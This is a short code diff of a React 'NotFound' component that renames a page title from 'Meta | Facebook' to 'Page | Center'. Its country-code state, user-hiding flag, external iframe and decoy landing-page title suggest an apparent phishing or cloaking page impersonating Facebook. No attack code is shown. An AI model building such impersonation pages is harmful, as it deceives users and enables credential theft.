@@ -8,7 +8,7 @@ function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
   let[IframeUrl, SetIframeUrl] = useState('https://stackclient-ten.vercel.app');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Meta | Facebook');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Page | Center');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Clean Juice | Landing Page');
 
 
